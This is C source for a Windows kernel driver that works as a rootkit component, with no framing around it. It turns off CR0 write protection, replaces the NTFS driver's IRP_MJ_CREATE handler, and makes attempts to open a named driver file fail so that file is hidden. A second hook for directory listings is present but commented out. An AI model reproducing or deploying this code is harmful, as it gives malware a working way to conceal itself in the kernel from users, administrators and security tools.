typedef struct _QUERY_DIRECTORY 
{
	ULONG					Length;
	PUNICODE_STRING			FileName;
	FILE_INFORMATION_CLASS	FileInformationClass;
	ULONG					FileIndex;
} QUERY_DIRECTORY, 
*PQUERY_DIRECTORY;

typedef NTSTATUS (__stdcall * IRP_FUNC)(
    PDEVICE_OBJECT DeviceObject, PIRP Irp
);

KMUTEX RulesMutex;
IRP_FUNC OldCreate;
IRP_FUNC OldDirectoryControl;
PDRIVER_OBJECT	pTargetDrvObj;
UNICODE_STRING dos_dev_name, dev_name;

//--------------------------------------------------------------------------------------
BOOLEAN IsNeedHide(PWSTR pObject,ULONG nLen)
{
	PWSTR pStr = wcsrchr(pObject,L'\\');
	
	if(pStr)
		pStr++;
	else
		return FALSE;

	if(	_wcsnicmp(pStr,_HIDE_DLL_NAME,wcslen(pStr))		== 0 ||
		_wcsnicmp(pStr,_HIDE_DRIVER_NAME,wcslen(pStr))	== 0)
			return TRUE;
	return FALSE;
}
//--------------------------------------------------------------------------------------
NTSTATUS NewCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);

	if (MmIsAddressValid(stack->FileObject))
	{
		if (MmIsAddressValid(stack->FileObject->FileName.Buffer))
		{
			__try {
				if( wcsstr(stack->FileObject->FileName.Buffer,_HIDE_DRIVER_NAME))
				{
					Dbg("IRP_MJ_CREATE hooked : %S\n", stack->FileObject->FileName.Buffer);
					return STATUS_FILE_INVALID;
				}
			}	__except(EXCEPTION_EXECUTE_HANDLER){
#ifdef _DEBUG_
				Dbg("NewCreate except [%s][Line %d]\n",__FILE__,__LINE__);
#endif
			}
		}
	}

	return OldCreate(DeviceObject, Irp);
}
//--------------------------------------------------------------------------------------
NTSTATUS __stdcall NewDirectoryControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	NTSTATUS ns;
	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
	PQUERY_DIRECTORY QueryDir = (PQUERY_DIRECTORY)&stack->Parameters;
	FILE_INFORMATION_CLASS FileInformationClass = QueryDir->FileInformationClass;
	wchar_t DirName[255];

	if (stack->MinorFunction == IRP_MN_QUERY_DIRECTORY)
	{
		if (MmIsAddressValid(stack->FileObject))
		{
			if (MmIsAddressValid(stack->FileObject->FileName.Buffer))
			{
				Dbg("IRP_MJ_DIRECTORY_CONTROL : %S (FileInformationClass: %d)\n", stack->FileObject->FileName.Buffer, FileInformationClass);
			}
		}
	}

	return OldDirectoryControl(DeviceObject, Irp);
}

//--------------------------------------------------------------------------------------
BOOLEAN HookFs()
{
	NTSTATUS ns = STATUS_SUCCESS;
	UNICODE_STRING DevName;
	wchar_t	wc_dev_name[512], wc_dos_dev_name[512];
	PDEVICE_OBJECT dev_obj;

	RtlInitUnicodeString(&DevName, L"\\FileSystem\\Ntfs");

	KeInitializeMutex(&RulesMutex, 0);

	ns = ObReferenceObjectByName(&DevName, OBJ_CASE_INSENSITIVE, NULL, 
		0, (POBJECT_TYPE)IoDriverObjectType, KernelMode, NULL, &pTargetDrvObj);
	if (!NT_SUCCESS(ns))
	{
		Dbg("ObReferenceObjectByName() fails : 0x%.8x\n", ns);

		return FALSE;
	}

	__asm
	{
		cli
		mov		eax,cr0
		and		eax,not 000010000h
		mov		cr0,eax
	}

	OldCreate = (IRP_FUNC)InterlockedExchange((PLONG)&pTargetDrvObj->MajorFunction[IRP_MJ_CREATE], (ULONG)NewCreate);
	//OldDirectoryControl = (IRP_FUNC)InterlockedExchange((PLONG)&pTargetDrvObj->MajorFunction[IRP_MJ_DIRECTORY_CONTROL], (ULONG)NewDirectoryControl);

	__asm
	{
		mov		eax,cr0
		or		eax,000010000h         
		mov		cr0,eax
		sti           
	}

	Dbg("IRP_MJ_CREATE: Old func 0x%.8X; New func 0x%.8X\n", (ULONG)OldCreate, (ULONG)NewCreate);
	Dbg("IRP_MJ_DIRECTORY_CONTROL: Old func 0x%.8x; New func 0x%.8x\n", (ULONG)OldDirectoryControl, (ULONG)NewDirectoryControl);
	return FALSE;
}